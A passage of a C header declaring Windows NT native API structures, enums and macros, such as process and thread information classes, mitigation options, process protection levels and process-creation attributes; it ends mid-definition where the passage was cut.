#define TRACELOG_ACCESS_REALTIME      0x0400
#define TRACELOG_REGISTER_GUIDS       0x0800

//
// Memory Partition Object Access Rights
//
#define MEMORY_PARTITION_QUERY_ACCESS  0x0001
#define MEMORY_PARTITION_MODIFY_ACCESS 0x0002

#define MEMORY_PARTITION_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED |         \
                                     SYNCHRONIZE |                      \
                                     MEMORY_PARTITION_QUERY_ACCESS |    \
                                     MEMORY_PARTITION_MODIFY_ACCESS)

//
// NtCreateProcessEx specific flags.
//
#define PS_REQUEST_BREAKAWAY        1
#define PS_NO_DEBUG_INHERIT         2
#define PS_INHERIT_HANDLES          4
#define PS_LARGE_PAGES              8
#define PS_ALL_FLAGS                (PS_REQUEST_BREAKAWAY | \
                                     PS_NO_DEBUG_INHERIT  | \
                                     PS_INHERIT_HANDLES   | \
                                     PS_LARGE_PAGES)

//
// Define special ByteOffset parameters for read and write operations
//
#define FILE_WRITE_TO_END_OF_FILE       0xffffffff
#define FILE_USE_FILE_POINTER_POSITION  0xfffffffe

//
// This is the maximum MaximumLength for a UNICODE_STRING.
//
#define MAXUSHORT   0xffff     
#define MAX_USTRING ( sizeof(WCHAR) * (MAXUSHORT/sizeof(WCHAR)) )

typedef struct _EX_RUNDOWN_REF {
    union
    {
        ULONG Count;
        PVOID Ptr;
    };
} EX_RUNDOWN_REF, *PEX_RUNDOWN_REF;

#ifdef _WIN64
#define MAX_FAST_REFS 15
#else
#define MAX_FAST_REFS 7
#endif

typedef struct _EX_FAST_REF {
    union {
        PVOID Object;
#if defined (_WIN64)
        ULONG_PTR RefCnt : 4;
#else
        ULONG_PTR RefCnt : 3;
#endif
        ULONG_PTR Value;
    };
} EX_FAST_REF, *PEX_FAST_REF;

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING;
typedef UNICODE_STRING *PUNICODE_STRING;
typedef const UNICODE_STRING *PCUNICODE_STRING;

#ifndef STATIC_UNICODE_STRING
#define STATIC_UNICODE_STRING(string, value) \
  static UNICODE_STRING string = { sizeof(value) - sizeof(WCHAR), sizeof(value), value };
#endif

typedef struct _STRING {
    USHORT Length;
    USHORT MaximumLength;
    PCHAR Buffer;
} STRING;
typedef STRING *PSTRING;

typedef STRING ANSI_STRING;
typedef PSTRING PANSI_STRING;

typedef STRING OEM_STRING;
typedef PSTRING POEM_STRING;
typedef CONST STRING* PCOEM_STRING;
typedef CONST char *PCSZ;

typedef struct _CSTRING {
    USHORT Length;
    USHORT MaximumLength;
    CONST char *Buffer;
} CSTRING;
typedef CSTRING *PCSTRING;
#define ANSI_NULL ((CHAR)0)

typedef STRING CANSI_STRING;
typedef PSTRING PCANSI_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES;
typedef OBJECT_ATTRIBUTES *POBJECT_ATTRIBUTES;

typedef struct _IO_STATUS_BLOCK {
    union {
        NTSTATUS Status;
        PVOID Pointer;
    } DUMMYUNIONNAME;

    ULONG_PTR Information;
} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;

/*
** FileCache and MemoryList START
*/

typedef enum _SYSTEM_MEMORY_LIST_COMMAND {
    MemoryCaptureAccessedBits,
    MemoryCaptureAndResetAccessedBits,
    MemoryEmptyWorkingSets,
    MemoryFlushModifiedList,
    MemoryPurgeStandbyList,
    MemoryPurgeLowPriorityStandbyList,
    MemoryCommandMax
} SYSTEM_MEMORY_LIST_COMMAND;

typedef struct _SYSTEM_FILECACHE_INFORMATION {
    SIZE_T CurrentSize;
    SIZE_T PeakSize;
    ULONG PageFaultCount;
    SIZE_T MinimumWorkingSet;
    SIZE_T MaximumWorkingSet;
    SIZE_T CurrentSizeIncludingTransitionInPages;
    SIZE_T PeakSizeIncludingTransitionInPages;
    ULONG TransitionRePurposeCount;
    ULONG Flags;
} SYSTEM_FILECACHE_INFORMATION, *PSYSTEM_FILECACHE_INFORMATION;

/*
** FileCache and MemoryList END
*/

/*
** Processes START
*/

typedef struct _SYSTEM_TIMEOFDAY_INFORMATION {
    LARGE_INTEGER BootTime;
    LARGE_INTEGER CurrentTime;
    LARGE_INTEGER TimeZoneBias;
    ULONG TimeZoneId;
    ULONG Reserved;
    ULONGLONG BootTimeBias;
    ULONGLONG SleepTimeBias;
} SYSTEM_TIMEOFDAY_INFORMATION, *PSYSTEM_TIMEOFDAY_INFORMATION;

typedef enum _THREAD_STATE {
    StateInitialized,
    StateReady,
    StateRunning,
    StateStandby,
    StateTerminated,
    StateWait,
    StateTransition,
    StateUnknown
} THREAD_STATE;

typedef enum _KWAIT_REASON {
    Executive,
    FreePage,
    PageIn,
    PoolAllocation,
    DelayExecution,
    Suspended,
    UserRequest,
    WrExecutive,
    WrFreePage,
    WrPageIn,
    WrPoolAllocation,
    WrDelayExecution,
    WrSuspended,
    WrUserRequest,
    WrEventPair,
    WrQueue,
    WrLpcReceive,
    WrLpcReply,
    WrVirtualMemory,
    WrPageOut,
    WrRendezvous,
    WrKeyedEvent,
    WrTerminated,
    WrProcessInSwap,
    WrCpuRateControl,
    WrCalloutStack,
    WrKernel,
    WrResource,
    WrPushLock,
    WrMutex,
    WrQuantumEnd,
    WrDispatchInt,
    WrPreempted,
    WrYieldExecution,
    WrFastMutex,
    WrGuardedMutex,
    WrRundown,
    WrAlertByThreadId,
    WrDeferredPreempt,
    MaximumWaitReason
} KWAIT_REASON;

typedef VOID KSTART_ROUTINE(
    _In_ PVOID StartContext
);
typedef KSTART_ROUTINE *PKSTART_ROUTINE;

typedef struct _CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef struct _CLIENT_ID64 {
    ULONG64 UniqueProcess;
    ULONG64 UniqueThread;
} CLIENT_ID64, *PCLIENT_ID64;

typedef struct _CLIENT_ID32 {
    ULONG32 UniqueProcess;
    ULONG32 UniqueThread;
} CLIENT_ID32, *PCLIENT_ID32;

typedef struct _VM_COUNTERS {
    SIZE_T PeakVirtualSize;
    SIZE_T VirtualSize;
    ULONG PageFaultCount;
    SIZE_T PeakWorkingSetSize;
    SIZE_T WorkingSetSize;
    SIZE_T QuotaPeakPagedPoolUsage;
    SIZE_T QuotaPagedPoolUsage;
    SIZE_T QuotaPeakNonPagedPoolUsage;
    SIZE_T QuotaNonPagedPoolUsage;
    SIZE_T PagefileUsage;
    SIZE_T PeakPagefileUsage;
    SIZE_T PrivatePageCount;
} VM_COUNTERS;

typedef struct _SYSTEM_THREAD_INFORMATION {
    LARGE_INTEGER KernelTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER CreateTime;
    ULONG WaitTime;
    PVOID StartAddress;
    CLIENT_ID ClientId;
    KPRIORITY Priority;
    KPRIORITY BasePriority;
    ULONG ContextSwitchCount;
    THREAD_STATE State;
    KWAIT_REASON WaitReason;
} SYSTEM_THREAD_INFORMATION, *PSYSTEM_THREAD_INFORMATION;

typedef struct _SYSTEM_EXTENDED_THREAD_INFORMATION {
    SYSTEM_THREAD_INFORMATION ThreadInfo;
    PVOID StackBase;
    PVOID StackLimit;
    PVOID Win32StartAddress;
    PVOID TebBase;
    ULONG_PTR Reserved2;
    ULONG_PTR Reserved3;
    ULONG_PTR Reserved4;
} SYSTEM_EXTENDED_THREAD_INFORMATION, *PSYSTEM_EXTENDED_THREAD_INFORMATION;

typedef struct _SYSTEM_PROCESSES_INFORMATION {
    ULONG NextEntryDelta;
    ULONG ThreadCount;
    LARGE_INTEGER SpareLi1;
    LARGE_INTEGER SpareLi2;
    LARGE_INTEGER SpareLi3;
    LARGE_INTEGER CreateTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER KernelTime;
    UNICODE_STRING ImageName;
    KPRIORITY BasePriority;
    HANDLE UniqueProcessId;
    HANDLE InheritedFromUniqueProcessId;
    ULONG HandleCount;
    ULONG SessionId;
    ULONG_PTR PageDirectoryBase;
    VM_COUNTERS VmCounters;
    IO_COUNTERS IoCounters;
    SYSTEM_THREAD_INFORMATION Threads[1];
} SYSTEM_PROCESSES_INFORMATION, *PSYSTEM_PROCESSES_INFORMATION;

typedef enum _SYSTEM_PROCESS_CLASSIFICATION {
    SystemProcessClassificationNormal,
    SystemProcessClassificationSystem,
    SystemProcessClassificationSecureSystem,
    SystemProcessClassificationMemCompression,
    SystemProcessClassificationRegistry,
    SystemProcessClassificationMaximum
} SYSTEM_PROCESS_CLASSIFICATION;

typedef struct _PROCESS_DISK_COUNTERS {
    ULONGLONG BytesRead;
    ULONGLONG BytesWritten;
    ULONGLONG ReadOperationCount;
    ULONGLONG WriteOperationCount;
    ULONGLONG FlushOperationCount;
} PROCESS_DISK_COUNTERS, *PPROCESS_DISK_COUNTERS;

typedef union _ENERGY_STATE_DURATION {
    union
    {
        ULONGLONG Value;
        ULONG LastChangeTime;
    };

    ULONG Duration : 31;
    ULONG IsInState : 1;
} ENERGY_STATE_DURATION, *PENERGY_STATE_DURATION;

typedef struct _PROCESS_ENERGY_VALUES {
    ULONGLONG Cycles[2][4];
    ULONGLONG DiskEnergy;
    ULONGLONG NetworkTailEnergy;
    ULONGLONG MBBTailEnergy;
    ULONGLONG NetworkTxRxBytes;
    ULONGLONG MBBTxRxBytes;
    union
    {
        ENERGY_STATE_DURATION Durations[3];
        struct
        {
            ENERGY_STATE_DURATION ForegroundDuration;
            ENERGY_STATE_DURATION DesktopVisibleDuration;
            ENERGY_STATE_DURATION PSMForegroundDuration;
        };
    };
    ULONG CompositionRendered;
    ULONG CompositionDirtyGenerated;
    ULONG CompositionDirtyPropagated;
    ULONG Reserved1;
    ULONGLONG AttributedCycles[4][2];
    ULONGLONG WorkOnBehalfCycles[4][2];
} PROCESS_ENERGY_VALUES, *PPROCESS_ENERGY_VALUES;

typedef struct _SYSTEM_PROCESS_INFORMATION_EXTENSION {
    PROCESS_DISK_COUNTERS DiskCounters;
    ULONGLONG ContextSwitches;
    union
    {
        ULONG Flags;
        struct
        {
            ULONG HasStrongId : 1;
            ULONG Classification : 4; // SYSTEM_PROCESS_CLASSIFICATION
            ULONG BackgroundActivityModerated : 1;
            ULONG Spare : 26;
        };
    };
    ULONG UserSidOffset;
    ULONG PackageFullNameOffset;
    PROCESS_ENERGY_VALUES EnergyValues;
    ULONG AppIdOffset;
    SIZE_T SharedCommitCharge;
    ULONG JobObjectId;
    ULONG SpareUlong;
    ULONGLONG ProcessSequenceNumber;
} SYSTEM_PROCESS_INFORMATION_EXTENSION, *PSYSTEM_PROCESS_INFORMATION_EXTENSION;

typedef struct _SYSTEM_PROCESSES_FULL_INFORMATION {
    SYSTEM_PROCESSES_INFORMATION ProcessAndThreads;
    SYSTEM_PROCESS_INFORMATION_EXTENSION ExtendedInfo;
} SYSTEM_PROCESSES_FULL_INFORMATION, *PSYSTEM_PROCESSES_FULL_INFORMATION;

typedef struct _SYSTEM_PROCESS_ID_INFORMATION {
    HANDLE ProcessId;
    UNICODE_STRING ImageName;
} SYSTEM_PROCESS_ID_INFORMATION, *PSYSTEM_PROCESS_ID_INFORMATION;

typedef struct _SYSTEM_SECUREBOOT_INFORMATION {
    BOOLEAN SecureBootEnabled;
    BOOLEAN SecureBootCapable;
} SYSTEM_SECUREBOOT_INFORMATION, *PSYSTEM_SECUREBOOT_INFORMATION;

typedef struct _SYSTEM_SECUREBOOT_POLICY_INFORMATION {
    GUID PolicyPublisher;
    ULONG PolicyVersion;
    ULONG PolicyOptions;
} SYSTEM_SECUREBOOT_POLICY_INFORMATION, *PSYSTEM_SECUREBOOT_POLICY_INFORMATION;

typedef struct _SYSTEM_SECUREBOOT_POLICY_FULL_INFORMATION {
    SYSTEM_SECUREBOOT_POLICY_INFORMATION PolicyInformation;
    ULONG PolicySize;
    UCHAR Policy[1];
} SYSTEM_SECUREBOOT_POLICY_FULL_INFORMATION, *PSYSTEM_SECUREBOOT_POLICY_FULL_INFORMATION;

typedef struct _SYSTEM_BASIC_INFORMATION {
    ULONG Reserved;
    ULONG TimerResolution;
    ULONG PageSize;
    ULONG NumberOfPhysicalPages;
    ULONG LowestPhysicalPageNumber;
    ULONG HighestPhysicalPageNumber;
    ULONG AllocationGranularity;
    ULONG_PTR MinimumUserModeAddress;
    ULONG_PTR MaximumUserModeAddress;
    ULONG_PTR ActiveProcessorsAffinityMask;
    CCHAR NumberOfProcessors;
} SYSTEM_BASIC_INFORMATION, *PSYSTEM_BASIC_INFORMATION;

typedef struct _SYSTEM_ISOLATED_USER_MODE_INFORMATION {
    BOOLEAN SecureKernelRunning : 1;
    BOOLEAN HvciEnabled : 1;
    BOOLEAN HvciStrictMode : 1;
    BOOLEAN DebugEnabled : 1;
    BOOLEAN FirmwarePageProtection : 1;
    BOOLEAN SpareFlags : 1;
    BOOLEAN TrustletRunning : 1;
    BOOLEAN SpareFlags2 : 1;
    BOOLEAN Spare0[6];
    ULONGLONG Spare1;
} SYSTEM_ISOLATED_USER_MODE_INFORMATION, *PSYSTEM_ISOLATED_USER_MODE_INFORMATION;

typedef enum _PROCESSINFOCLASS {
    ProcessBasicInformation = 0,
    ProcessQuotaLimits = 1,
    ProcessIoCounters = 2,
    ProcessVmCounters = 3,
    ProcessTimes = 4,
    ProcessBasePriority = 5,
    ProcessRaisePriority = 6,
    ProcessDebugPort = 7,
    ProcessExceptionPort = 8,
    ProcessAccessToken = 9,
    ProcessLdtInformation = 10,
    ProcessLdtSize = 11,
    ProcessDefaultHardErrorMode = 12,
    ProcessIoPortHandlers = 13,
    ProcessPooledUsageAndLimits = 14,
    ProcessWorkingSetWatch = 15,
    ProcessUserModeIOPL = 16,
    ProcessEnableAlignmentFaultFixup = 17,
    ProcessPriorityClass = 18,
    ProcessWx86Information = 19,
    ProcessHandleCount = 20,
    ProcessAffinityMask = 21,
    ProcessPriorityBoost = 22,
    ProcessDeviceMap = 23,
    ProcessSessionInformation = 24,
    ProcessForegroundInformation = 25,
    ProcessWow64Information = 26,
    ProcessImageFileName = 27,
    ProcessLUIDDeviceMapsEnabled = 28,
    ProcessBreakOnTermination = 29,
    ProcessDebugObjectHandle = 30,
    ProcessDebugFlags = 31,
    ProcessHandleTracing = 32,
    ProcessIoPriority = 33,
    ProcessExecuteFlags = 34,
    ProcessTlsInformation = 35,
    ProcessCookie = 36,
    ProcessImageInformation = 37,
    ProcessCycleTime = 38,
    ProcessPagePriority = 39,
    ProcessInstrumentationCallback = 40,
    ProcessThreadStackAllocation = 41,
    ProcessWorkingSetWatchEx = 42,
    ProcessImageFileNameWin32 = 43,
    ProcessImageFileMapping = 44,
    ProcessAffinityUpdateMode = 45,
    ProcessMemoryAllocationMode = 46,
    ProcessGroupInformation = 47,
    ProcessTokenVirtualizationEnabled = 48,
    ProcessOwnerInformation = 49,
    ProcessWindowInformation = 50,
    ProcessHandleInformation = 51,
    ProcessMitigationPolicy = 52,
    ProcessDynamicFunctionTableInformation = 53,
    ProcessHandleCheckingMode = 54,
    ProcessKeepAliveCount = 55,
    ProcessRevokeFileHandles = 56,
    ProcessWorkingSetControl = 57,
    ProcessHandleTable = 58,
    ProcessCheckStackExtentsMode = 59,
    ProcessCommandLineInformation = 60,
    ProcessProtectionInformation = 61,
    ProcessMemoryExhaustion = 62,
    ProcessFaultInformation = 63,
    ProcessTelemetryIdInformation = 64,
    ProcessCommitReleaseInformation = 65,
    ProcessDefaultCpuSetsInformation = 66,
    ProcessAllowedCpuSetsInformation = 67,
    ProcessSubsystemProcess = 68,
    ProcessJobMemoryInformation = 69,
    ProcessInPrivate = 70,
    ProcessRaiseUMExceptionOnInvalidHandleClose = 71,
    ProcessIumChallengeResponse = 72,
    ProcessChildProcessInformation = 73,
    ProcessHighGraphicsPriorityInformation = 74,
    ProcessSubsystemInformation = 75,
    ProcessEnergyValues = 76,
    ProcessActivityThrottleState = 77,
    ProcessActivityThrottlePolicy = 78,
    ProcessWin32kSyscallFilterInformation = 79,
    ProcessDisableSystemAllowedCpuSets = 80,
    ProcessWakeInformation = 81,
    ProcessEnergyTrackingState = 82,
    ProcessManageWritesToExecutableMemory = 83,
    ProcessCaptureTrustletLiveDump = 84,
    ProcessTelemetryCoverage = 85,
    ProcessEnclaveInformation = 86,
    ProcessEnableReadWriteVmLogging = 87,
    ProcessUptimeInformation = 88,
    ProcessImageSection = 89,
    ProcessDebugAuthInformation = 90,
    ProcessSystemResourceManagement = 91,
    ProcessSequenceNumber = 92,
    ProcessLoaderDetour = 93,
    ProcessSecurityDomainInformation = 93,
    ProcessCombineSecurityDomainsInformation = 94,
    ProcessEnableLogging = 95,
    ProcessLeapSecondInformation = 96,
    MaxProcessInfoClass
} PROCESSINFOCLASS;

typedef enum _THREADINFOCLASS {
    ThreadBasicInformation,
    ThreadTimes,
    ThreadPriority,
    ThreadBasePriority,
    ThreadAffinityMask,
    ThreadImpersonationToken,
    ThreadDescriptorTableEntry,
    ThreadEnableAlignmentFaultFixup,
    ThreadEventPair,
    ThreadQuerySetWin32StartAddress,
    ThreadZeroTlsCell,
    ThreadPerformanceCount,
    ThreadAmILastThread,
    ThreadIdealProcessor,
    ThreadPriorityBoost,
    ThreadSetTlsArrayAddress,
    ThreadIsIoPending,
    ThreadHideFromDebugger,
    ThreadBreakOnTermination,
    ThreadSwitchLegacyState,
    ThreadIsTerminated,
    ThreadLastSystemCall,
    ThreadIoPriority,
    ThreadCycleTime,
    ThreadPagePriority,
    ThreadActualBasePriority,
    ThreadTebInformation,
    ThreadCSwitchMon,
    ThreadCSwitchPmu,
    ThreadWow64Context,
    ThreadGroupInformation,
    ThreadUmsInformation,
    ThreadCounterProfiling,
    ThreadIdealProcessorEx,
    ThreadCpuAccountingInformation,
    ThreadSuspendCount,
    ThreadHeterogeneousCpuPolicy,
    ThreadContainerId,
    ThreadNameInformation,
    ThreadSelectedCpuSets,
    ThreadSystemThreadInformation,
    ThreadActualGroupAffinity,
    ThreadDynamicCodePolicyInfo,
    ThreadExplicitCaseSensitivity,
    ThreadWorkOnBehalfTicket,
    ThreadSubsystemInformation,
    ThreadDbgkWerReportActive,
    ThreadAttachContainer,
    ThreadManageWritesToExecutableMemory,
    ThreadPowerThrottlingState,
    ThreadWorkloadClass,
    MaxThreadInfoClass
} THREADINFOCLASS;

typedef struct _PROCESS_BASIC_INFORMATION {
    NTSTATUS ExitStatus;
    PVOID PebBaseAddress;
    ULONG_PTR AffinityMask;
    KPRIORITY BasePriority;
    ULONG_PTR UniqueProcessId;
    ULONG_PTR InheritedFromUniqueProcessId;
} PROCESS_BASIC_INFORMATION, *PPROCESS_BASIC_INFORMATION;

typedef struct _THREAD_BASIC_INFORMATION {
    NTSTATUS ExitStatus;
    PVOID TebBaseAddress;
    CLIENT_ID ClientId;
    ULONG_PTR AffinityMask;
    KPRIORITY Priority;
    LONG BasePriority;
} THREAD_BASIC_INFORMATION, *PTHREAD_BASIC_INFORMATION;

typedef struct _PROCESS_EXTENDED_BASIC_INFORMATION {
    SIZE_T Size;
    PROCESS_BASIC_INFORMATION BasicInfo;
    union
    {
        ULONG Flags;
        struct
        {
            ULONG IsProtectedProcess : 1;
            ULONG IsWow64Process : 1;
            ULONG IsProcessDeleting : 1;
            ULONG IsCrossSessionCreate : 1;
            ULONG IsFrozen : 1;
            ULONG IsBackground : 1;
            ULONG IsStronglyNamed : 1;
            ULONG IsSecureProcess : 1;
            ULONG IsSubsystemProcess : 1;
            ULONG SpareBits : 23;
        } DUMMYSTRUCTNAME;
    } DUMMYUNIONNAME;
} PROCESS_EXTENDED_BASIC_INFORMATION, *PPROCESS_EXTENDED_BASIC_INFORMATION;

typedef struct _PROCESS_ACCESS_TOKEN {
    HANDLE Token;
    HANDLE Thread;
} PROCESS_ACCESS_TOKEN, *PPROCESS_ACCESS_TOKEN;

typedef struct _PROCESS_HANDLE_TABLE_ENTRY_INFO {
    HANDLE HandleValue;
    ULONG_PTR HandleCount;
    ULONG_PTR PointerCount;
    ULONG GrantedAccess;
    ULONG ObjectTypeIndex;
    ULONG HandleAttributes;
    ULONG Reserved;
} PROCESS_HANDLE_TABLE_ENTRY_INFO, *PPROCESS_HANDLE_TABLE_ENTRY_INFO;

typedef struct _PROCESS_HANDLE_SNAPSHOT_INFORMATION {
    ULONG NumberOfHandles;
    ULONG Reserved;
    PROCESS_HANDLE_TABLE_ENTRY_INFO Handles[1];
} PROCESS_HANDLE_SNAPSHOT_INFORMATION, *PPROCESS_HANDLE_SNAPSHOT_INFORMATION;

typedef enum _PS_MITIGATION_OPTION {
    PS_MITIGATION_OPTION_NX,
    PS_MITIGATION_OPTION_SEHOP,
    PS_MITIGATION_OPTION_FORCE_RELOCATE_IMAGES,
    PS_MITIGATION_OPTION_HEAP_TERMINATE,
    PS_MITIGATION_OPTION_BOTTOM_UP_ASLR,
    PS_MITIGATION_OPTION_HIGH_ENTROPY_ASLR,
    PS_MITIGATION_OPTION_STRICT_HANDLE_CHECKS,
    PS_MITIGATION_OPTION_WIN32K_SYSTEM_CALL_DISABLE,
    PS_MITIGATION_OPTION_EXTENSION_POINT_DISABLE,
    PS_MITIGATION_OPTION_PROHIBIT_DYNAMIC_CODE,
    PS_MITIGATION_OPTION_CONTROL_FLOW_GUARD,
    PS_MITIGATION_OPTION_BLOCK_NON_MICROSOFT_BINARIES,
    PS_MITIGATION_OPTION_FONT_DISABLE,
    PS_MITIGATION_OPTION_IMAGE_LOAD_NO_REMOTE,
    PS_MITIGATION_OPTION_IMAGE_LOAD_NO_LOW_LABEL,
    PS_MITIGATION_OPTION_IMAGE_LOAD_PREFER_SYSTEM32,
    PS_MITIGATION_OPTION_RETURN_FLOW_GUARD,
    PS_MITIGATION_OPTION_LOADER_INTEGRITY_CONTINUITY,
    PS_MITIGATION_OPTION_STRICT_CONTROL_FLOW_GUARD,
    PS_MITIGATION_OPTION_RESTRICT_SET_THREAD_CONTEXT,
    PS_MITIGATION_OPTION_ROP_STACKPIVOT,
    PS_MITIGATION_OPTION_ROP_CALLER_CHECK,
    PS_MITIGATION_OPTION_ROP_SIMEXEC,
    PS_MITIGATION_OPTION_EXPORT_ADDRESS_FILTER,
    PS_MITIGATION_OPTION_EXPORT_ADDRESS_FILTER_PLUS,
    PS_MITIGATION_OPTION_RESTRICT_CHILD_PROCESS_CREATION,
    PS_MITIGATION_OPTION_IMPORT_ADDRESS_FILTER,
    PS_MITIGATION_OPTION_MODULE_TAMPERING_PROTECTION,
    PS_MITIGATION_OPTION_RESTRICT_INDIRECT_BRANCH_PREDICTION,
    PS_MITIGATION_OPTION_SPECULATIVE_STORE_BYPASS_DISABLE,
    PS_MITIGATION_OPTION_ALLOW_DOWNGRADE_DYNAMIC_CODE_POLICY,
    PS_MITIGATION_OPTION_CET_SHADOW_STACKS
} PS_MITIGATION_OPTION;

typedef enum _PS_CREATE_STATE {
    PsCreateInitialState,
    PsCreateFailOnFileOpen,
    PsCreateFailOnSectionCreate,
    PsCreateFailExeFormat,
    PsCreateFailMachineMismatch,
    PsCreateFailExeName,
    PsCreateSuccess,
    PsCreateMaximumStates
} PS_CREATE_STATE;

typedef struct _PS_CREATE_INFO {
    SIZE_T Size;
    PS_CREATE_STATE State;
    union
    {
        struct
        {
            union
            {
                ULONG InitFlags;
                struct
                {
                    UCHAR WriteOutputOnExit : 1;
                    UCHAR DetectManifest : 1;
                    UCHAR IFEOSkipDebugger : 1;
                    UCHAR IFEODoNotPropagateKeyState : 1;
                    UCHAR SpareBits1 : 4;
                    UCHAR SpareBits2 : 8;
                    USHORT ProhibitedImageCharacteristics : 16;
                };
            };
            ACCESS_MASK AdditionalFileAccess;
        } InitState;

        struct
        {
            HANDLE FileHandle;
        } FailSection;

        struct
        {
            USHORT DllCharacteristics;
        } ExeFormat;

        struct
        {
            HANDLE IFEOKey;
        } ExeName;

        struct
        {
            union
            {
                ULONG OutputFlags;
                struct
                {
                    UCHAR ProtectedProcess : 1;
                    UCHAR AddressSpaceOverride : 1;
                    UCHAR DevOverrideEnabled : 1;
                    UCHAR ManifestDetected : 1;
                    UCHAR ProtectedProcessLight : 1;
                    UCHAR SpareBits1 : 3;
                    UCHAR SpareBits2 : 8;
                    USHORT SpareBits3 : 16;
                };
            };
            HANDLE FileHandle;
            HANDLE SectionHandle;
            ULONGLONG UserProcessParametersNative;
            ULONG UserProcessParametersWow64;
            ULONG CurrentParameterFlags;
            ULONGLONG PebAddressNative;
            ULONG PebAddressWow64;
            ULONGLONG ManifestAddress;
            ULONG ManifestSize;
        } SuccessState;
    };
} PS_CREATE_INFO, *PPS_CREATE_INFO;

typedef struct _PS_ATTRIBUTE {
    ULONG Attribute;
    SIZE_T Size;
    union
    {
        ULONG Value;
        PVOID ValuePtr;
    };
    PSIZE_T ReturnLength;
} PS_ATTRIBUTE, *PPS_ATTRIBUTE;

typedef struct _PS_ATTRIBUTE_LIST {
    SIZE_T TotalLength;
    PS_ATTRIBUTE Attributes[1];
} PS_ATTRIBUTE_LIST, *PPS_ATTRIBUTE_LIST;

typedef enum _PS_PROTECTED_TYPE {
    PsProtectedTypeNone,
    PsProtectedTypeProtectedLight,
    PsProtectedTypeProtected,
    PsProtectedTypeMax
} PS_PROTECTED_TYPE;

typedef enum _PS_PROTECTED_SIGNER {
    PsProtectedSignerNone,
    PsProtectedSignerAuthenticode,
    PsProtectedSignerCodeGen,
    PsProtectedSignerAntimalware,
    PsProtectedSignerLsa,
    PsProtectedSignerWindows,
    PsProtectedSignerWinTcb,
    PsProtectedSignerWinSystem,
    PsProtectedSignerApp,
    PsProtectedSignerMax
} PS_PROTECTED_SIGNER;

typedef struct _PS_PROTECTION {
    union
    {
        UCHAR Level;
        struct
        {
            UCHAR Type : 3;
            UCHAR Audit : 1;
            UCHAR Signer : 4;
        };
    };
} PS_PROTECTION, *PPS_PROTECTION;

// begin_rev
#define PS_ATTRIBUTE_NUMBER_MASK 0x0000ffff
#define PS_ATTRIBUTE_THREAD 0x00010000 
#define PS_ATTRIBUTE_INPUT 0x00020000 
#define PS_ATTRIBUTE_ADDITIVE 0x00040000 
// end_rev

typedef enum _PS_ATTRIBUTE_NUM {
    PsAttributeParentProcess,
    PsAttributeDebugPort,
    PsAttributeToken,
    PsAttributeClientId,
    PsAttributeTebAddress,
    PsAttributeImageName,
    PsAttributeImageInfo,
    PsAttributeMemoryReserve,
    PsAttributePriorityClass,
    PsAttributeErrorMode,
    PsAttributeStdHandleInfo,
    PsAttributeHandleList,
    PsAttributeGroupAffinity,
    PsAttributePreferredNode,
    PsAttributeIdealProcessor,
    PsAttributeUmsThread,
    PsAttributeMitigationOptions,
    PsAttributeProtectionLevel,
    PsAttributeSecureProcess,
    PsAttributeJobList,
    PsAttributeChildProcessPolicy,
    PsAttributeAllApplicationPackagesPolicy,
    PsAttributeWin32kFilter,
    PsAttributeSafeOpenPromptOriginClaim,
    PsAttributeBnoIsolation,
    PsAttributeDesktopAppPolicy,
    PsAttributeChpe,
    PsAttributeMax
} PS_ATTRIBUTE_NUM;

#define PsAttributeValue(Number, Thread, Input, Unknown) \
    (((Number) & PS_ATTRIBUTE_NUMBER_MASK) | \
    ((Thread) ? PS_ATTRIBUTE_THREAD : 0) | \
    ((Input) ? PS_ATTRIBUTE_INPUT : 0) | \
    ((Unknown) ? PS_ATTRIBUTE_ADDITIVE : 0))

#define PS_ATTRIBUTE_PARENT_PROCESS \
    PsAttributeValue(PsAttributeParentProcess, FALSE, TRUE, TRUE)
#define PS_ATTRIBUTE_DEBUG_PORT \
    PsAttributeValue(PsAttributeDebugPort, FALSE, TRUE, TRUE)
#define PS_ATTRIBUTE_TOKEN \
    PsAttributeValue(PsAttributeToken, FALSE, TRUE, TRUE)
#define PS_ATTRIBUTE_CLIENT_ID \
    PsAttributeValue(PsAttributeClientId, TRUE, FALSE, FALSE)
#define PS_ATTRIBUTE_TEB_ADDRESS \
    PsAttributeValue(PsAttributeTebAddress, TRUE, FALSE, FALSE)
#define PS_ATTRIBUTE_IMAGE_NAME \
    PsAttributeValue(PsAttributeImageName, FALSE, TRUE, FALSE)
#define PS_ATTRIBUTE_IMAGE_INFO \
    PsAttributeValue(PsAttributeImageInfo, FALSE, FALSE, FALSE)
#define PS_ATTRIBUTE_MEMORY_RESERVE \
    PsAttributeValue(PsAttributeMemoryReserve, FALSE, TRUE, FALSE)
#define PS_ATTRIBUTE_PRIORITY_CLASS \
    PsAttributeValue(PsAttributePriorityClass, FALSE, TRUE, FALSE)
#define PS_ATTRIBUTE_ERROR_MODE \
    PsAttributeValue(PsAttributeErrorMode, FALSE, TRUE, FALSE)
#define PS_ATTRIBUTE_STD_HANDLE_INFO \
    PsAttributeValue(PsAttributeStdHandleInfo, FALSE, TRUE, FALSE)
#define PS_ATTRIBUTE_HANDLE_LIST \
    PsAttributeValue(PsAttributeHandleList, FALSE, TRUE, FALSE)
#define PS_ATTRIBUTE_GROUP_AFFINITY \
    PsAttributeValue(PsAttributeGroupAffinity, TRUE, TRUE, FALSE)
#define PS_ATTRIBUTE_PREFERRED_NODE \
    PsAttributeValue(PsAttributePreferredNode, FALSE, TRUE, FALSE)
#define PS_ATTRIBUTE_IDEAL_PROCESSOR \
    PsAttributeValue(PsAttributeIdealProcessor, TRUE, TRUE, FALSE)
#define PS_ATTRIBUTE_UMS_THREAD \
    PsAttributeValue(PsAttributeUmsThread, TRUE, TRUE, FALSE)
#define PS_ATTRIBUTE_MITIGATION_OPTIONS \
    PsAttributeValue(PsAttributeMitigationOptions, FALSE, TRUE, TRUE)
#define PS_ATTRIBUTE_PROTECTION_LEVEL \
